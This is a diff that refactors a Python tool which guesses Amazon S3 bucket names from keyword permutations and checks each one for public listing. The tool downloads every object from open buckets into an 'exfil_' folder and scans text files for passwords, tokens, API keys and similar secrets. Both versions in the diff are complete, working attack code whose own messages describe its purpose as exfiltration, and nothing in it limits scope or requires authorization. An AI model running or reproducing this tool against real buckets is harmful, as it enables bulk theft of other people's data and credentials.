@@ -2,124 +2,115 @@ import os
 import time
 import requests
 import itertools
-import xml.etree.ElementTree as XmlElementTree
+import xml.etree.ElementTree as xmlET
 
-def PromptForMode() -> str:
+def promptForMode() -> str:
     print("[MODE] Select input method:")
     print("1. Enter exact bucket name")
     print("2. Enter keyword list (auto-combo mode)")
-    strChoice = input("Enter choice (1 or 2): ").strip()
-    return strChoice
+    return input("Enter choice (1 or 2): ").strip()
 
-def PromptForBucketName() -> str:
-    strBucketName = input("Enter target S3 bucket name (without s3://): ").strip()
-    return strBucketName
+def promptForBucketName() -> str:
+    return input("Enter target S3 bucket name (without s3://): ").strip()
 
-def PromptForKeywords() -> list[str]:
-    strInput = input("Enter keywords (max 4, space-separated, e.g. dev secret test): ")
-    return strInput.strip().lower().split()
+def promptForKeywords() -> list[str]:
+    return input("Enter keywords (max 4, space-separated, e.g. dev secret test): ").strip().lower().split()
 
-def GenerateBucketCombos(aKeywords: list[str]) -> list[str]:
-    aCombinations = []
-    for n in range(2, min(len(aKeywords)+1, 5)):
-        for aCombo in itertools.permutations(aKeywords, n):
-            strJoinedDash = '-'.join(aCombo)
-            strJoinedUnderscore = '_'.join(aCombo)
-            strJoinedPlain = ''.join(aCombo)
-            aCombinations.extend([strJoinedDash, strJoinedUnderscore, strJoinedPlain])
-    return list(set(aCombinations))
+def generateBucketCombos(arrKeywords: list[str]) -> list[str]:
+    arrCombinations = []
+    for n in range(2, min(len(arrKeywords) + 1, 5)):
+        for arrCombo in itertools.permutations(arrKeywords, n):
+            strDash = '-'.join(arrCombo)
+            strUnderscore = '_'.join(arrCombo)
+            strPlain = ''.join(arrCombo)
+            arrCombinations.extend([strDash, strUnderscore, strPlain])
+    return list(set(arrCombinations))
 
-def CheckIfBucketIsPublic(strBucketName: str) -> tuple[bool, str]:
-    strBucketURL = f"http://{strBucketName}.s3.amazonaws.com/"
-    print(f"[INFO] {strBucketName}")
+def checkIfBucketIsPublic(strBucketName: str) -> tuple[bool, str]:
+    strURL = f"http://{strBucketName}.s3.amazonaws.com/"
+    print(f"[INFO] Checking bucket: {strBucketName}")
     try:
-        objResponse = requests.get(strBucketURL, timeout=(2, 5))
-        bIsPublic = (objResponse.status_code == 200)
-        strResponseText = objResponse.text
-        return bIsPublic, strResponseText
+        objResponse = requests.get(strURL, timeout=(2, 5))
+        return objResponse.status_code == 200, objResponse.text
     except Exception as e:
-        print(f"[ERROR] {strBucketName} error: {str(e)}")
+        print(f"[ERROR] {strBucketName} error: {e}")
         return False, ""
 
-def ParseS3FileKeys(strXMLResponse: str) -> list[str]:
-    aKeys = []
+def parseS3FileKeys(xmlResponse: str) -> list[str]:
+    arrKeys = []
     try:
-        objXMLRoot = XmlElementTree.fromstring(strXMLResponse)
-        for objElement in objXMLRoot.iter('{http://s3.amazonaws.com/doc/2006-03-01/}Key'):
+        objRoot = xmlET.fromstring(xmlResponse)
+        for objElement in objRoot.iter('{http://s3.amazonaws.com/doc/2006-03-01/}Key'):
             if objElement.text:
-                aKeys.append(objElement.text)
-    except XmlElementTree.ParseError:
+                arrKeys.append(objElement.text)
+    except xmlET.ParseError:
         pass
-    return aKeys
+    return arrKeys
 
-def ScanTextFileForSecrets(strFilePath: str, strOutputDir: str, aCustomKeywords: list[str] = None) -> None:
-    aKeywords = aCustomKeywords if aCustomKeywords else ["password", "passwd", "secret", "key", "api", "token", "db", "auth"]
-    strOutFilePath = os.path.join(strOutputDir, "relevant_lines.txt")
-    aMatchedLines = []
+def scanTextFileForSecrets(strFilePath: str, strOutputDir: str, arrCustomKeywords: list[str] = None) -> None:
+    arrKeywords = arrCustomKeywords if arrCustomKeywords else ["password", "passwd", "secret", "key", "api", "token", "db", "auth"]
+    strOutFile = os.path.join(strOutputDir, "relevant_lines.txt")
+    arrMatchedLines = []
     try:
-        with open(strFilePath, 'r', encoding='utf-8', errors='ignore') as fInputFile:
-            for strLine in fInputFile:
-                for strKeyword in aKeywords:
+        with open(strFilePath, 'r', encoding='utf-8', errors='ignore') as fInput:
+            for strLine in fInput:
+                for strKeyword in arrKeywords:
                     if strKeyword.lower() in strLine.lower():
                         print(f"[FOUND] {strLine.strip()}")
-                        aMatchedLines.append(strLine)
+                        arrMatchedLines.append(strLine)
                         break
-        if aMatchedLines:
-            with open(strOutFilePath, 'a', encoding='utf-8') as fOutput:
-                fOutput.writelines(aMatchedLines)
+        if arrMatchedLines:
+            with open(strOutFile, 'a', encoding='utf-8') as fOut:
+                fOut.writelines(arrMatchedLines)
     except Exception as e:
-        print(f"[ERROR] Failed to scan file '{strFilePath}': {str(e)}")
+        print(f"[ERROR] Failed scanning '{strFilePath}': {e}")
 
-def DownloadS3Object(strBucketName: str, strKey: str, strOutputDir: str, aScanKeywords: list[str] = None) -> None:
+def downloadS3Object(strBucketName: str, strKey: str, strOutputDir: str, arrScanKeywords: list[str] = None) -> None:
     strFileURL = f"https://{strBucketName}.s3.amazonaws.com/{strKey}"
-    strSanitizedFileName = strKey.replace('/', '_')
-    strOutputPath = os.path.join(strOutputDir, strSanitizedFileName)
+    strSafeName = strKey.replace('/', '_')
+    strOutPath = os.path.join(strOutputDir, strSafeName)
     objResponse = requests.get(strFileURL)
     if objResponse.status_code == 200:
-        with open(strOutputPath, 'wb') as fOutputFile:
-            fOutputFile.write(objResponse.content)
-        print(f"[INFO] Downloaded: {strKey} -> {strOutputPath}")
-        if strOutputPath.lower().endswith(".txt"):
-            ScanTextFileForSecrets(strOutputPath, strOutputDir, aScanKeywords)
+        with open(strOutPath, 'wb') as fOut:
+            fOut.write(objResponse.content)
+        print(f"[INFO] Downloaded: {strKey} -> {strOutPath}")
+        if strOutPath.lower().endswith(".txt"):
+            scanTextFileForSecrets(strOutPath, strOutputDir, arrScanKeywords)
     else:
-        print(f"[ERROR] Failed to download {strKey} (HTTP {objResponse.status_code})")
+        print(f"[ERROR] Failed download {strKey} (HTTP {objResponse.status_code})")
 
-def AttemptExfilFromBucket(strBucketName: str, aScanKeywords: list[str] = None) -> None:
-    bIsPublic, strXMLListing = CheckIfBucketIsPublic(strBucketName)
+def attemptExfilFromBucket(strBucketName: str, arrScanKeywords: list[str] = None) -> None:
+    bIsPublic, strListing = checkIfBucketIsPublic(strBucketName)
     if not bIsPublic:
-        print(f"[ERROR] '{strBucketName}' is not publicly listable or does not exist.")
+        print(f"[ERROR] '{strBucketName}' not listable or not exist.")
         return
-    print(f"[FOUND] '{strBucketName}' is PUBLIC. Proceeding to exfiltrate files...")
-    aFileKeys = ParseS3FileKeys(strXMLListing)
-    if not aFileKeys:
-        print("[INFO] No files found or listing disabled.")
+    print(f"[FOUND] '{strBucketName}' is PUBLIC - proceeding with enumeration.")
+    arrKeys = parseS3FileKeys(strListing)
+    if not arrKeys:
+        print("[INFO] No objects found or listing disabled.")
         return
-    strOutputDir = f"exfiltrated_{strBucketName}"
+    strOutputDir = f"exfil_{strBucketName}"
     os.makedirs(strOutputDir, exist_ok=True)
-    for strFileKey in aFileKeys:
-        print(f"[FOUND] {strFileKey} is public")
-        DownloadS3Object(strBucketName, strFileKey, strOutputDir, aScanKeywords)
-    print(f"[INFO] Exfiltration complete. Files saved in: {strOutputDir}")
+    for strKey in arrKeys:
+        print(f"[FOUND] Object: {strKey}")
+        downloadS3Object(strBucketName, strKey, strOutputDir, arrScanKeywords)
+    print(f"[INFO] Exfiltration complete. Files in: {strOutputDir}")
 
-def Main() -> None:
-    strMode = PromptForMode()
-
-    strInput = input("Enter scan keywords (space-separated), or press ENTER to use defaults: ").strip()
-    aScanKeywords = strInput.lower().split() if strInput else None
+def main() -> None:
+    strMode = promptForMode()
+    strInput = input("Enter scan keywords (space-separated), or press ENTER for defaults: ").strip()
+    arrScanKeywords = strInput.lower().split() if strInput else None
 
     if strMode == "1":
-        strBucketName = PromptForBucketName()
-        AttemptExfilFromBucket(strBucketName, aScanKeywords)
+        attemptExfilFromBucket(promptForBucketName(), arrScanKeywords)
     elif strMode == "2":
-        aKeywords = PromptForKeywords()
-        nDelaySec = int(input("Enter delay between attempts (in seconds, e.g., 5): ").strip())
-        aBucketCombos = GenerateBucketCombos(aKeywords)
-        print(f"[INFO] Trying {len(aBucketCombos)} bucket combinations...")
-        for strBucketName in aBucketCombos:
-            AttemptExfilFromBucket(strBucketName, aScanKeywords)
-            time.sleep(nDelaySec)
+        arrKeywords = promptForKeywords()
+        intDelaySec = int(input("Enter delay between attempts (seconds): ").strip())
+        for strBucket in generateBucketCombos(arrKeywords):
+            attemptExfilFromBucket(strBucket, arrScanKeywords)
+            time.sleep(intDelaySec)
     else:
-        print("[ERROR] Invalid choice.")
+        print("[ERROR] Invalid mode choice.")
 
 if __name__ == "__main__":
-    Main()
+    main()
